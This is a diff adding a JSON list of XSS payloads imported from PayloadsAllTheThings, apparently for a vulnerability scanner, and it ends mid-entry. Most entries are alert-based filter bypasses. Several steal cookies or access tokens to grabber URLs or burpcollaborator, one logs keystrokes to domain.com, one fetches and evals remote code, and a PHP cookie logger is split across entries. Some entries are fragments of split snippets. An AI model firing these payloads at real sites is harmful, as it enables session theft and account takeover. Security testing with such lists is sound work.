@@ -1,0 +1,1772 @@
+[
+  {
+    "id": "xss-0001",
+    "payload": "<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0002",
+    "payload": "<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0003",
+    "payload": "<script>new Image().src=\"http://localhost/cookie.php?c=\"+document.cookie;</script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0004",
+    "payload": "<script>new Image().src=\"http://localhost/cookie.php?c=\"+localStorage.getItem('access_token');</script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0005",
+    "payload": "<?php",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0006",
+    "payload": "$cookie = $_GET['c'];",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0007",
+    "payload": "$fp = fopen('cookies.txt', 'a+');",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0008",
+    "payload": "fwrite($fp, 'Cookie:' .$cookie.\"\\r\\n\");",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0009",
+    "payload": "fclose($fp);",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0010",
+    "payload": "<script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0011",
+    "payload": "fetch('https://<SESSION>.burpcollaborator.net', {",
+    "mode": "attack",
+    "risk_level": "high",
+    "enabled_by_default": false,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0012",
+    "payload": "method: 'POST',",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0013",
+    "payload": "mode: 'no-cors',",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0014",
+    "payload": "body: document.cookie",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0015",
+    "payload": "});",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0016",
+    "payload": "</script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0017",
+    "payload": "history.replaceState(null, null, '../../../login');",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0018",
+    "payload": "document.body.innerHTML = \"</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>\"",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0019",
+    "payload": "<img src=x onerror='document.onkeypress=function(e){fetch(\"http://domain.com?k=\"+String.fromCharCode(e.which))},this.remove();'>",
+    "mode": "attack",
+    "risk_level": "high",
+    "enabled_by_default": false,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0020",
+    "payload": "<script>debugger;</script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0021",
+    "payload": "<script>alert(document.domain.concat(\"\\n\").concat(window.origin))</script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0022",
+    "payload": "<script>console.log(\"Test XSS from the search bar of page XYZ\\n\".concat(document.domain).concat(\"\\n\").concat(window.origin))</script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0023",
+    "payload": "// Basic payload",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0024",
+    "payload": "<script>alert('XSS')</script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0025",
+    "payload": "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0026",
+    "payload": "\"><script>alert('XSS')</script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0027",
+    "payload": "\"><script>alert(String.fromCharCode(88,83,83))</script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0028",
+    "payload": "<script>\\u0061lert('22')</script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0029",
+    "payload": "<script>eval('\\x61lert(\\'33\\')')</script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0030",
+    "payload": "<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt(\"confirm\",30) == 8680439 && 8680439..toString(30) == \"confirm\"",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0031",
+    "payload": "<object/data=\"jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;\">",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0032",
+    "payload": "// Img payload",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0033",
+    "payload": "<img src=x onerror=alert('XSS');>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0034",
+    "payload": "<img src=x onerror=alert('XSS')//",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0035",
+    "payload": "<img src=x onerror=alert(String.fromCharCode(88,83,83));>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0036",
+    "payload": "<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0037",
+    "payload": "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0038",
+    "payload": "\"><img src=x onerror=alert('XSS');>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0039",
+    "payload": "\"><img src=x onerror=alert(String.fromCharCode(88,83,83));>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0040",
+    "payload": "<><img src=1 onerror=alert(1)>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0041",
+    "payload": "// Svg payload",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0042",
+    "payload": "<svg",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0043",
+    "payload": "onload=alert(1)>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0044",
+    "payload": "<svg/onload=alert('XSS')>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0045",
+    "payload": "<svg onload=alert(1)//",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0046",
+    "payload": "<svg/onload=alert(String.fromCharCode(88,83,83))>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0047",
+    "payload": "<svg id=alert(1) onload=eval(id)>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0048",
+    "payload": "\"><svg/onload=alert(String.fromCharCode(88,83,83))>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0049",
+    "payload": "\"><svg/onload=alert(/XSS/)",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0050",
+    "payload": "<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0051",
+    "payload": "<svg><script>alert('33')",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0052",
+    "payload": "<svg><script>alert&lpar;'33'&rpar;",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0053",
+    "payload": "// Div payload",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0054",
+    "payload": "<div onpointerover=\"alert(45)\">MOVE HERE</div>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0055",
+    "payload": "<div onpointerdown=\"alert(45)\">MOVE HERE</div>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0056",
+    "payload": "<div onpointerenter=\"alert(45)\">MOVE HERE</div>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0057",
+    "payload": "<div onpointerleave=\"alert(45)\">MOVE HERE</div>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0058",
+    "payload": "<div onpointermove=\"alert(45)\">MOVE HERE</div>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0059",
+    "payload": "<div onpointerout=\"alert(45)\">MOVE HERE</div>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0060",
+    "payload": "<div onpointerup=\"alert(45)\">MOVE HERE</div>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0061",
+    "payload": "<body onload=alert(/XSS/.source)>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0062",
+    "payload": "<input autofocus onfocus=alert(1)>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0063",
+    "payload": "<select autofocus onfocus=alert(1)>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0064",
+    "payload": "<textarea autofocus onfocus=alert(1)>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0065",
+    "payload": "<keygen autofocus onfocus=alert(1)>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0066",
+    "payload": "<video/poster/onerror=alert(1)>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0067",
+    "payload": "<video><source onerror=\"javascript:alert(1)\">",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0068",
+    "payload": "<video src=_ onloadstart=\"alert(1)\">",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0069",
+    "payload": "<details/open/ontoggle=\"alert`1`\">",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0070",
+    "payload": "<audio src onloadstart=alert(1)>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0071",
+    "payload": "<marquee onstart=alert(1)>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0072",
+    "payload": "<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0073",
+    "payload": "<body ontouchstart=alert(1)> // Triggers when a finger touch the screen",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0074",
+    "payload": "<body ontouchend=alert(1)>   // Triggers when a finger is removed from touch screen",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0075",
+    "payload": "<body ontouchmove=alert(1)>  // When a finger is dragged across the screen.",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0076",
+    "payload": "<svg/onload='fetch(\"//host/a\").then(r=>r.text().then(t=>eval(t)))'>",
+    "mode": "attack",
+    "risk_level": "high",
+    "enabled_by_default": false,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0077",
+    "payload": "<script src=14.rs>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0078",
+    "payload": "// you can also specify an arbitrary payload with 14.rs/#payload",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0079",
+    "payload": "e.g: 14.rs/#alert(document.domain)",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0080",
+    "payload": "<input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\">",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0081",
+    "payload": "Use CTRL+SHIFT+X to trigger the onclick event",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0082",
+    "payload": "<input type=\"hidden\" oncontentvisibilityautostatechange=\"alert(1)\"  style=\"content-visibility:auto\" >",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0083",
+    "payload": "<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0084",
+    "payload": "-(confirm)(document.domain)//",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0085",
+    "payload": "; alert(1);//",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0086",
+    "payload": "// (payload without quote/double quote from [@brutelogic](https://twitter.com/brutelogic)",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0087",
+    "payload": "javascript:prompt(1)",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0088",
+    "payload": "%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0089",
+    "payload": "&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
